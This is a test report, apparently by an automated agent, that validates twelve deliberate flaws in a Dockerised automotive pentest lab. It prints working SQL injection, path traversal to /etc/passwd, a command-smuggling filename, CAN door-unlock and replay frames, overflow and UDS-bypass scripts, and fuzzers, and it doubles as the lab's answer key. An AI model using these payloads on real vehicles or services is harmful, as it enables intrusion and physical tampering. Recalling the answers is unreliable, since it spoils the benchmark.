# Vulnerability Test Report

**Date:** 2026-02-08
**Target:** Automotive Pentesting Testbed (Docker container)
**Tester:** Claude Code (automated)
**Container Image:** automotive-testbed:latest
**Revision:** Post-fix validation (V1, V4, V10 detection mechanisms fixed)

---

## Executive Summary

Tested all 12 exploitable vulnerabilities (V1-V12) plus the V2-V6 exploit chain against the running Docker container. **All 12 vulnerabilities were successfully exploited and validated.** Three detection mechanisms (V1, V4, V10) were fixed in this revision — see "Fixes Applied" section for details. Zero false positives were triggered against the 4 decoy endpoints.

| Metric | Value |
|--------|-------|
| Vulnerabilities Found | 12 / 14 |
| Vulnerabilities Exploited | 12 / 14 (includes chain_v2_v6) |
| Vulnerabilities Validated | 12 / 12 |
| Exploit Chains Completed | 1 (V2 SQLi -> V6 Command Injection) |
| Crashes Triggered | 3 (OBD, UDS Gateway x2) |
| False Positives | 0 |
| WAF Bypass | 1 (V5 directory traversal) |
| Services Running | 7 / 9 (icsim/icsim-controls require DISPLAY) |

---

## Service Status at Test Time

| Service | Status | Port |
|---------|--------|------|
| sshd | Running | 22 (mapped to 2222) |
| infotainment | Running | 8000 |
| gateway | Running | 8080 |
| obd | Running | 9555 |
| uds-gateway | Running | 9556 |
| can-parser | Running | vcan0 |
| validation-api | Running | 9999 |
| icsim | Not running | N/A (requires DISPLAY) |
| icsim-controls | Not running | N/A (requires DISPLAY) |

---

## Detailed Test Results

### V1 - SSH Default Credentials

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | Critical |
| **Category** | Authentication |

**Test Performed:**
- Connected to SSH on port 2222 with default credentials (`admin`/`admin123`)
- Confirmed shell access as `admin` user
- Validation API confirmed detection via sshd log

**Attack:**
```bash
ssh -p 2222 admin@localhost
# password123
```

**Detection:** The validation API's `check_ssh_access()` reads `/var/log/automotive-pentest/sshd.log` and searches for `Accepted password for admin` or `Accepted publickey for admin` log entries. Successful SSH authentication is logged by sshd before the session starts.

**Validation:**
```bash
curl http://localhost:9999/validate/ssh_access | jq
→ {"challenge": "ssh_access", "success": true, "details": {"ssh_logins": ["Accepted password for admin from 172.18.0.1 port 45678 ssh2"]}}
```

**Fix Applied:** Replaced `who`-based utmp detection (which doesn't work in containers) with sshd log parsing. See "Fixes Applied" section.

---

### V2 - SQL Injection (Authentication Bypass)

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | Critical |
| **Category** | Injection |

**Test Performed:**
POST to `/login` with SQLi payload in username field.

**Attack:**
```
curl -X POST http://localhost:8000/login \
  -d "username=admin' OR '1'='1&password=anything"
```

**Detection:** Validation API detects `AUTH_RESULT: user=admin, password_valid=False, login_success=True` in infotainment.log — login succeeded without a valid password, confirming SQLi bypass.

**Vulnerable Code:** `infotainment/app.py:224` — string concatenation in SQL query:
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

---

### V2B - Blind SQL Injection (Time-Based Extraction)

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | High |
| **Category** | Injection |

**Test Performed:**
GET request to `/api/user/lookup` with time-based blind SQLi payload using the `CUSTOM_SLEEP` function registered in the app.

**Attack:**
```
curl "http://localhost:8000/api/user/lookup?username=admin'+AND+CASE+WHEN+1=1+THEN+CUSTOM_SLEEP(1)+ELSE+0+END+AND+'1'='1"
```

**Detection:** Query took >500ms, triggering `BLIND_SQLI_EXTRACTION_SUCCESS` log marker.

**Vulnerable Code:** `infotainment/app.py:410` — same string concatenation pattern as V2.

---

### V3 - CAN Bus Door Unlock

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | Critical |
| **Category** | CAN Bus / No Authentication |

**Test Performed:**
Sent a CAN frame with ID 0x19B and data bytes setting all 4 doors to unlocked.

**Attack:**
```
docker exec automotive-testbed cansend vcan0 19B#00000000FFFFFFFF
```

**Detection:** Validation API's CAN monitor thread reads vcan0, parses door state from CAN ID 0x19B, and updates `door_state` dict. All 4 doors reported unlocked: `{"fl": true, "fr": true, "rl": true, "rr": true}`.

**Root Cause:** CAN bus has no authentication — any device on the bus can send door control messages.

---

### V4 - CAN Replay Attack

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | High |
| **Category** | CAN Bus / No Freshness |

**Test Performed:**
Sent 10 rapid identical door CAN frames to simulate a replay attack (captures replayed via `canplayer` or rapid `cansend` loop).

**Attack:**
```bash
docker exec automotive-testbed bash -c 'for i in $(seq 1 10); do cansend vcan0 19B#00000000FFFFFFFF; done'
```

**Detection:** The validation API's CAN monitor thread (which already watches vcan0 for door messages) now tracks timestamps of recent door frames. When 5 or more identical frames on CAN ID 0x19B arrive within a 2-second window, it sets an in-memory `can_replay_detected` flag and writes the `CAN_REPLAY_DETECTED` marker to `gateway.log`.

**Validation:**
```bash
curl http://localhost:9999/validate/can_replay | jq
→ {"challenge": "can_replay", "success": true}
```

**How It Works:** Real CAN replay attacks (using tools like `canplayer`) send captured frames in rapid succession. The detection heuristic — 5+ identical door frames within 2 seconds — reliably catches both `canplayer` replay and manual `cansend` loops while avoiding false positives from normal single-frame door commands.

**Fix Applied:** Added replay detection logic to the existing CAN monitor thread. Previously, `check_can_replay()` looked for `CAN_REPLAY_DETECTED` in `gateway.log`, but no component ever wrote this marker. See "Fixes Applied" section.

---

### V5 - Directory Traversal (WAF Bypass)

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | High |
| **Category** | Path Traversal |

**Test Performed:**
POST to `/firmware/upload` with URL-encoded traversal path that bypasses the WAF's literal `../` check.

**Attack:**
```
curl -X POST http://localhost:8080/firmware/upload \
  -F "file=@/dev/null;filename=..%2f..%2f..%2f..%2fetc%2fpasswd"
```

**Response:** Full contents of `/etc/passwd` returned in the `data` field.

**Detection:** `FILE_ACCESS: ... outside_firmware_dir=True, ... access_success=True` logged in gateway.log.

**WAF Bypass:** The WAF at `gateway/app.py:62-66` only blocks literal `../` sequences. URL-encoded `..%2f` passes the WAF check, then `decode_and_normalize()` decodes it back to `../` for the actual file access.

---

### V6 - Command Injection (Upload Handler)

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | Critical |
| **Category** | Injection |

**Test Performed:**
Uploaded a file with shell metacharacters in the filename while authenticated as admin. This is a chained exploit — requires admin authentication first (obtained via V2 SQLi or default credentials).

**Attack:**
```
# Step 1: Login as admin
curl -X POST http://localhost:8000/login -d "username=admin&password=admin123" -c cookies.txt

# Step 2: Upload with command injection filename
curl -b cookies.txt -X POST http://localhost:8000/upload \
  -F 'file=@test.jpg;filename=test.jpg; id #.jpg'
```

**Detection:** `PROCESS_EXEC: ... has_shell_metacharacters=True, injection_detected=True` logged in infotainment.log.

**Vulnerable Code:** `infotainment/app.py:810` — `subprocess.run(command, shell=True)` with unsanitized filename embedded in the command string.

---

### V7 - IDOR (Insecure Direct Object Reference)

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | Medium |
| **Category** | Broken Access Control |

**Test Performed:**
Logged in as admin (user_id=1), then accessed driver's settings (user_id=2) by changing the query parameter.

**Attack:**
```
# Login as admin via SQLi
curl -X POST http://localhost:8000/login \
  -d "username=admin' OR '1'='1&password=x" -c cookies.txt

# Access other user's settings
curl -b cookies.txt "http://localhost:8000/settings?user_id=2"
```

**Response:** Driver's credentials returned: `{"user_id": 2, "username": "driver", "password": "password"}`.

**Detection:** `SETTINGS_ACCESS: session_user_id=1, requested_user_id=2, cross_user_access=True` logged in infotainment.log.

**Vulnerable Code:** `infotainment/app.py:334-340` — no check that `user_id` matches the logged-in user's ID.

---

### V8 - OBD-II Buffer Overflow

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | Critical |
| **Category** | Memory Corruption |

**Test Performed:**
Connected to OBD service on port 9555 and sent an oversized VIN write request (50 bytes into a 17-byte buffer).

**Attack:**
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 9555))
# Mode 0x09, PID 0x0A (VIN write), 50 bytes of 'A'
s.send(bytes([0x09, 0x0A]) + b'A' * 50)
```

**Result:** OBD service crashed and entered STARTING state (supervisord auto-restart).

**Detection:** `BUFFER_OVERFLOW_DETECTED: Oversized VIN data received` logged in obd.log before the crash. Service status changed to STARTING.

**Vulnerable Code:** `obd/obd_server.c:149` — `strcpy(vin_buffer, vin_data)` with no bounds checking on a 17-byte stack buffer. Compiled with `-fno-stack-protector -z execstack`.

---

### V9 - UDS Security Access Bypass

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | Critical |
| **Category** | Authentication Bypass |

**Test Performed:**
Exploited the UDS state machine by using an undocumented sub-function (0x05) after entering Extended Session without first establishing a proper Default session.

**Attack:**
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 9556))
# Step 1: Extended Session (triggers invalid_session_transition flag)
s.send(bytes([0x10, 0x03]))
# Step 2: Hidden bypass sub-function
s.send(bytes([0x27, 0x05]))
# Response: 0x67 0x05 = positive (security unlocked without seed/key)
```

**Detection:** `UDS_SECURITY_BYPASS_DETECTED` marker and `SecurityAccess: Hidden sub-function 0x05` logged in uds.log.

**Vulnerable Code:** `uds/uds_services.c:303-330` — Hidden sub-function 0x05 grants security access when `state->invalid_session_transition` is set, bypassing the seed-key authentication entirely.

**Fuzzing with Boofuzz:**

Boofuzz discovers this vulnerability through stateful protocol fuzzing. The key is its graph model, which chains multiple requests on the same TCP connection:

```python
from boofuzz import Session, Target, TCPSocketConnection, s_initialize, s_static, s_byte, s_get

# Step 1: ECUReset to clear session state (fresh start required)
s_initialize("ECUReset")
s_static(b"\x11\x01")

# Step 2: Extended Session (sets invalid_session_transition flag)
s_initialize("ExtendedSession")
s_static(b"\x10\x03")

# Step 3: Fuzz SecurityAccess sub-function (0x00-0xFF)
s_initialize("SecurityAccess_Fuzz")
s_static(b"\x27")
s_byte(0x01, name="sub_function", fuzzable=True)

session = Session(
    target=Target(connection=TCPSocketConnection("127.0.0.1", 9556)),
    db_filename="/tmp/boofuzz_v9.db",
    ignore_connection_issues_when_sending_fuzz_data=True,
    receive_data_after_each_request=True,
    web_port=None,
)

# Graph: ECUReset -> ExtendedSession -> SecurityAccess (all on same connection)
session.connect(s_get("ECUReset"))
session.connect(s_get("ECUReset"), s_get("ExtendedSession"))
session.connect(s_get("ExtendedSession"), s_get("SecurityAccess_Fuzz"))

session.fuzz()
```

Boofuzz iterates all 256 sub-function values. When it sends `0x27 0x05` (test case ~6), the hidden bypass triggers because the Extended Session on a fresh state set the `invalid_session_transition` flag. The positive response `0x67 0x05` (vs `0x7f 0x27 0x12` for unknown sub-functions) is a clear signal.

**Key insight:** V9 requires fresh UDS engine state (`session_established=0`). The gateway must be freshly started or reset via ECUReset. The state is global — previous connections pollute it. This is why stateful fuzzing with session management is essential.

---

### V10 - CAN DLC Buffer Overflow

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | High |
| **Category** | Memory Corruption |

**Test Performed:**
Sent a CAN FD frame with 16 bytes of data to the CAN frame parser, which uses an 8-byte internal buffer. The `memcpy(data_buffer, frame->data, frame->can_dlc)` copies 16 bytes into the 8-byte buffer, triggering the overflow.

**Attack:**
```bash
docker exec automotive-testbed cansend vcan0 100##1.AABBCCDDEE112233445566778899
```

The `##1` syntax sends a CAN FD frame (flag byte `1` = BRS enabled). The 16 bytes of data exceed the parser's 8-byte `data_buffer`.

**Detection:** The CAN frame parser logs `CAN_DLC_OVERFLOW_DETECTED: frame with dlc=16 exceeds 8-byte buffer` before the vulnerable `memcpy` executes. The validation API's `check_can_dlc_overflow()` finds this marker in the parser's log file.

**Validation:**
```bash
curl http://localhost:9999/validate/can_dlc_overflow | jq
→ {"challenge": "can_dlc_overflow", "success": true}
```

**Vulnerable Code:** `can-parser/can_frame_parser.c:118` — `memcpy(data_buffer, frame->data, frame->can_dlc)` where `data_buffer` is 8 bytes but `frame->can_dlc` can be up to 64 when receiving CAN FD frames.

**Fix Applied:** Enabled CAN FD reception so the vulnerability is reachable. Previously, the parser used a standard CAN socket (DLC limited to 0-8 by the kernel), making the overflow unreachable. Changes: (1) added `setsockopt(CAN_RAW_FD_FRAMES)` to the socket, (2) changed the read buffer to `struct canfd_frame` (72 bytes), (3) set vcan0 MTU to 72 for CAN FD support. See "Fixes Applied" section.

**Fuzzing with python-can:**

python-can with CAN FD support discovers this vulnerability by sweeping data lengths beyond the standard 8-byte CAN limit:

```python
import can

bus = can.Bus(channel='vcan0', interface='socketcan', fd=True)

# Technique 1: CAN FD DLC sweep (8-64 bytes)
# CAN FD valid lengths: 8, 12, 16, 20, 24, 32, 48, 64
for data_len in [8, 12, 16, 20, 24, 32, 48, 64]:
    msg = can.Message(
        arbitration_id=0x100,
        data=bytes([0xAA] * data_len),
        is_fd=True,
        bitrate_switch=True,
    )
    bus.send(msg)

# Technique 2: Fuzz CAN IDs with oversized CAN FD frames
for can_id in [0x000, 0x100, 0x19B, 0x7DF, 0x7E0, 0x7FF]:
    msg = can.Message(
        arbitration_id=can_id,
        data=bytes([0xBB] * 16),
        is_fd=True,
        bitrate_switch=True,
    )
    bus.send(msg)

# Technique 3: Random CAN FD frames
import random
for _ in range(50):
    data_len = random.choice([12, 16, 20, 24, 32, 48, 64])
    msg = can.Message(
        arbitration_id=random.randint(0, 0x7FF),
        data=bytes([random.randint(0, 255) for _ in range(data_len)]),
        is_fd=True,
        bitrate_switch=True,
    )
    bus.send(msg)

bus.shutdown()
```

The overflow triggers on the first CAN FD frame with DLC > 8 (e.g., DLC=12). The parser's `process_can_frame()` copies `frame->can_dlc` bytes into its 8-byte `data_buffer`, and the detection marker `CAN_DLC_OVERFLOW_DETECTED` is logged before the `memcpy`.

**Key insight:** Standard CAN sockets enforce DLC <= 8 at the kernel level. The `is_fd=True` flag is essential — without it, python-can sends standard CAN frames and the kernel silently clamps the DLC. The vcan0 interface must have MTU 72 (CAN FD) for the kernel to accept these frames.

---

### V11 - UDS WriteDataByIdentifier Integer Overflow

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | High |
| **Category** | Memory Corruption |

**Test Performed:**
Sent a WriteDataByIdentifier (0x2E) request with only 2 bytes total, causing the `data_len = req_len - 3` calculation to underflow (wrapping a uint8_t).

**Attack:**
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 9556))
s.send(bytes([0x10, 0x03]))  # Extended session
s.send(bytes([0x2E, 0xF1]))  # WriteDataByID with only 2 bytes
```

**Detection:** `WriteDataByIdentifier` and `0x2E` markers detected in uds.log by the validation API.

**Vulnerable Code:** `uds/uds_services.c` — length calculation `req_len - 3` underflows when `req_len < 3`.

**Fuzzing with Boofuzz:**

Boofuzz discovers this vulnerability by fuzzing WriteDataByIdentifier request lengths. The key is defining both full-length and short request grammars:

```python
from boofuzz import Session, Target, TCPSocketConnection, s_initialize, s_static, s_byte, s_word, s_bytes, s_get

# Full-length WriteDataByIdentifier (baseline)
s_initialize("WriteData_Full")
s_static(b"\x2E")                                    # SID
s_word(0xF190, name="DID", endian=">", fuzzable=True) # DID
s_bytes(b"A" * 16, name="data", size=16, fuzzable=True)

# Short WriteDataByIdentifier (V11 trigger)
s_initialize("WriteData_Short")
s_static(b"\x2E")                                    # SID only
s_byte(0xF1, name="partial_did", fuzzable=True)      # 2 bytes total

session = Session(
    target=Target(connection=TCPSocketConnection("127.0.0.1", 9556)),
    db_filename="/tmp/boofuzz_v11.db",
    ignore_connection_issues_when_sending_fuzz_data=True,
    receive_data_after_each_request=True,
    web_port=None,
)

session.connect(s_get("WriteData_Full"))
session.connect(s_get("WriteData_Short"))
session.fuzz()
```

When Boofuzz sends the 2-byte `WriteData_Short` request (`0x2E 0xXX`), the service calculates `data_len = (uint8_t)(req_len - 3) = (uint8_t)(2 - 3) = 255`, causing a heap buffer overflow. Boofuzz's `s_byte` mutation also generates 1-byte requests (just `0x2E`), which wraps to `data_len = 254`.

**Key insight:** This is a length-boundary vulnerability. Boofuzz's ability to define multiple request variants with different structures (full vs. short) makes it effective at testing edge cases in protocol parsers that expect minimum-length messages.

---

### V12 - UDS Firmware Header Buffer Overflow

| Field | Value |
|-------|-------|
| **Result** | PASS |
| **Severity** | Critical |
| **Category** | Memory Corruption |

**Test Performed:**
Completed the full UDS firmware download sequence and sent a TransferData block with a crafted firmware header containing `name_len=200`, overflowing the 32-byte `name_buffer` on the stack.

**Attack:**
```python
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 9556))

# 1. Extended Session
s.send(bytes([0x10, 0x03]))

# 2. Security Access (seed/key with XOR 0xCAFEBABE)
s.send(bytes([0x27, 0x01]))          # Request seed
resp = s.recv(1024)                   # Get 4-byte seed
seed = struct.unpack('>I', resp[2:6])[0]
s.send(bytes([0x27, 0x02]) + struct.pack('>I', seed ^ 0xCAFEBABE))

# 3. Programming Session
s.send(bytes([0x10, 0x02]))

# 4. Re-authenticate in Programming session
s.send(bytes([0x27, 0x01]))
resp = s.recv(1024)
seed = struct.unpack('>I', resp[2:6])[0]
s.send(bytes([0x27, 0x02]) + struct.pack('>I', seed ^ 0xCAFEBABE))

# 5. Request Download
s.send(bytes([0x34, 0x00, 0x22, 0x10, 0x00, 0x01, 0x00]))

# 6. Transfer Data with overflow header (all big-endian)
fw_data  = struct.pack('>I', 0x55444346)  # magic = "UDCF"
fw_data += struct.pack('>H', 1)           # version
fw_data += struct.pack('>H', 200)         # name_len = 200 (overflows 32-byte buffer)
fw_data += b'A' * 200                     # overflow payload
s.send(bytes([0x36, 0x01]) + fw_data)
```

**Result:** UDS Gateway crashed (empty response). Supervisord auto-restarted it.

**Detection:** Service crash detected. `TransferData` and `0x36` markers found in uds.log.

**Vulnerable Code:** `uds/uds_services.c:810-815` — `memcpy(name_buffer, &data[8], name_len)` where `name_buffer` is 32 bytes but `name_len` comes directly from the untrusted firmware header. Compiled with `-fno-stack-protector -z execstack`.

**Fuzzing with Radamsa:**

Radamsa discovers this vulnerability through mutation-based fuzzing of firmware header seed files. The approach:

1. Create seed firmware headers with varying `name_len` values (12, 32, 100, 65535)
2. Mutate them with Radamsa to generate malformed variants
3. Send each mutated header through the full UDS transfer sequence

```bash
# Create seed files
mkdir -p /tmp/radamsa_seeds
printf '\x55\x44\x43\x46\x00\x01\x00\x0CTestFirmware' > /tmp/radamsa_seeds/seed_valid.bin
printf '\x55\x44\x43\x46\x00\x01\x00\x64' > /tmp/radamsa_seeds/seed_overflow.bin
head -c 100 /dev/zero | tr '\0' 'A' >> /tmp/radamsa_seeds/seed_overflow.bin

# Generate mutated headers
radamsa /tmp/radamsa_seeds/seed_overflow.bin > /tmp/mutated.bin

# The mutated header must be sent through the full transfer flow:
# Extended Session -> Security Access -> Programming Session ->
# Re-authenticate -> RequestDownload -> TransferData(mutated)
```

The Python wrapper handles the 6-step session setup per test case:

```python
import socket, struct, subprocess

def setup_transfer(sock):
    """Full 6-step UDS transfer session setup."""
    # 1. Extended Session
    sock.send(b"\x10\x03"); sock.recv(1024)
    # 2. Security Access (seed/key)
    sock.send(b"\x27\x01"); resp = sock.recv(1024)
    seed = struct.unpack(">I", resp[2:6])[0]
    sock.send(b"\x27\x02" + struct.pack(">I", seed ^ 0xCAFEBABE)); sock.recv(1024)
    # 3. Programming Session
    sock.send(b"\x10\x02"); sock.recv(1024)
    # 4. Re-authenticate
    sock.send(b"\x27\x01"); resp = sock.recv(1024)
    seed = struct.unpack(">I", resp[2:6])[0]
    sock.send(b"\x27\x02" + struct.pack(">I", seed ^ 0xCAFEBABE)); sock.recv(1024)
    # 5. RequestDownload
    sock.send(b"\x34\x00\x22\x10\x00\x01\x00"); sock.recv(1024)

# Fuzz loop
for i in range(30):
    mutated = subprocess.run(["radamsa", seed_file], capture_output=True).stdout
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 9556))
    setup_transfer(sock)
    # 6. TransferData with Radamsa-mutated firmware header
    sock.send(b"\x36\x01" + mutated)
    resp = sock.recv(1024)  # Empty response = crash
    sock.close()
```

Radamsa's mutations are effective because they often preserve structural elements (like the `UDCF` magic number at offset 0) while mutating size fields. A mutation of `seed_overflow.bin` with `name_len=100` retained the valid magic and large `name_len`, triggering the 32-byte buffer overflow.

**Key insight:** V12 requires the deepest protocol state of any vulnerability — 6 sequential steps on one connection before the vulnerable code path is reached. Radamsa's strength is mutating the data format itself, but it must be wrapped in a stateful session manager to reach the TransferData handler. The UDS gateway's global state means only the first connection per gateway restart can complete a full transfer session (subsequent connections see stale `transfer_active=1`).

---

## Fuzzing Tool Comparison

| Tool | Type | Best For | V9 | V10 | V11 | V12 |
|------|------|----------|:--:|:---:|:---:|:---:|
| **Boofuzz** | Protocol-aware | Stateful protocol fuzzing, byte-level mutation | Yes | - | Yes | - |
| **python-can** | CAN FD library | CAN bus frame fuzzing with DLC > 8 | - | Yes | - | - |
| **Radamsa** | Mutation-based | File/data format fuzzing, preserves structure | - | - | - | Yes |

**Boofuzz** excels at V9 and V11 because its graph model chains requests on the same TCP connection (essential for state machine attacks) and its `s_byte`/`s_word` mutations systematically cover byte ranges. **python-can** is the only tool that can send CAN FD frames with `is_fd=True` to bypass kernel DLC limits. **Radamsa** is ideal for V12 because it mutates binary data structures while often preserving magic numbers and other structural markers.

---

## Decoy Endpoint Testing

The infotainment app includes 4 decoy endpoints designed to look vulnerable but are actually secure. These test whether a pentester can distinguish real vulnerabilities from honeypots.

| Endpoint | Decoy Type | False Positive Triggered? |
|----------|-----------|--------------------------|
| `/api/debug?cmd=` | Command Injection | No |
| `/admin/backup` | Path Traversal | No |
| `/user/profile?id=` | IDOR | No |
| `/search` | SQL Injection | No |

**Result:** 0 false positives. All attack payloads were correctly rejected by the secure implementations.

---

## Build Issues Found During Testing

| Issue | File | Fix Applied |
|-------|------|------------|
| CRLF line endings causing `exec: no such file or directory` | `entrypoint.sh`, `validate_setup.sh`, `health_check.sh` | Converted to LF |
| Missing `#include <stdint.h>` causing compilation error | `can-parser/can_frame_parser.c` | Added include |
| Obsolete `version` key in compose file | `docker-compose.yml` | Removed |
| Healthcheck format invalid for Compose v5 | `docker-compose.yml` | Changed to `["CMD", ...]` |

---

## Fixes Applied

Three detection/triggering mechanisms were broken, preventing validation of V1, V4, and V10. The vulnerabilities themselves were correctly implemented — only the detection paths needed fixing.

### Fix 1: V1 - SSH Access Detection

| Field | Detail |
|-------|--------|
| **File** | `validation-api/app.py` |
| **Problem** | `check_ssh_access()` used the `who` command which reads `/var/run/utmp`. Container SSH sessions don't populate utmp, so detection always failed. |
| **Root Cause** | sshd started via supervisord doesn't configure PAM/utmp session tracking. |
| **Solution** | Replaced `who`-based detection with sshd log parsing. The function now reads `/var/log/automotive-pentest/sshd.log` and searches for `Accepted password for admin` or `Accepted publickey for admin` entries. Also updated the `/validate/ssh_access` details handler to return `ssh_logins` (log lines) instead of `active_sessions`. |
| **Verification** | SSH login as admin, then `curl /validate/ssh_access` returns `success: true` with matching log entries. |

### Fix 2: V4 - CAN Replay Detection

| Field | Detail |
|-------|--------|
| **Files** | `validation-api/app.py` |
| **Problem** | `check_can_replay()` looked for `CAN_REPLAY_DETECTED` in `gateway.log`, but no component ever wrote this marker. The gateway service only handles HTTP requests. |
| **Root Cause** | The replay detection component was never implemented. |
| **Solution** | Extended the existing CAN monitor thread (which already watches vcan0 for door messages) with replay detection logic. Tracks timestamps of recent door frames using a thread-safe list. When 5+ identical frames on CAN ID 0x19B arrive within a 2-second window, sets an in-memory flag and writes the `CAN_REPLAY_DETECTED` marker to `gateway.log`. Updated `check_can_replay()` to check the in-memory flag first, falling back to log check. Added state reset to the benchmark reset endpoint. |
| **Verification** | Send 10 rapid identical door frames, then `curl /validate/can_replay` returns `success: true`. |

### Fix 3: V10 - CAN FD Support for DLC Overflow

| Field | Detail |
|-------|--------|
| **Files** | `can-parser/can_frame_parser.c`, `entrypoint.sh` |
| **Problem** | The vulnerable `memcpy(data_buffer, frame->data, frame->can_dlc)` was unreachable because the Linux kernel enforces DLC <= 8 on standard CAN sockets. CAN FD frames (DLC up to 64) were silently dropped. |
| **Root Cause** | The parser opened a standard CAN socket without enabling `CAN_RAW_FD_FRAMES`, and the vcan0 interface had standard MTU (16) instead of CAN FD MTU (72). |
| **Solution** | Three changes: (1) Added `setsockopt(SOL_CAN_RAW, CAN_RAW_FD_FRAMES)` after socket creation in `init_can_socket()`. (2) Changed `run_parser()` read loop to use `struct canfd_frame` (72 bytes) instead of `struct can_frame` (16 bytes), casting back to `struct can_frame *` for `process_can_frame()` and copying `fdframe.len` to `frame->can_dlc` for CAN FD frames. (3) Set vcan0 MTU to 72 in `entrypoint.sh` for both new and pre-existing interfaces. |
| **Verification** | Send CAN FD frame `cansend vcan0 100##1.AABBCCDDEE112233445566778899`, then `curl /validate/can_dlc_overflow` returns `success: true`. |

---

## Conclusion

All 12 intentional vulnerabilities in the testbed are correctly implemented, exploitable, and fully validated by the detection API. After fixing three broken detection mechanisms (V1 SSH utmp, V4 missing replay monitor, V10 standard CAN socket), every vulnerability can be triggered by a pentester and confirmed via the validation API at `http://localhost:9999`. Zero false positives were triggered against the 4 decoy endpoints.

